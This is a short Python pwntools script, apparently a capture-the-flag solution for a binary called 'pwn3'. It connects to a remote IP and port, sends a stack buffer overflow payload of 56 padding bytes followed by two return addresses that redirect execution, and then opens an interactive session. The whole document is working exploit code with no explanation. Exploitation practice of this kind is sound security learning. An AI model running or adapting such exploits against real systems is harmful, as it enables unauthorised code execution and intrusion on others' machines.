from pwn import *

# p = process('./pwn3')
p= remote('3.1.32.51', 8001)

payload = b'A'*56
payload += p64(0x40101a)
payload += p64(0x4011b6)

p.sendline(payload)

p.interactive()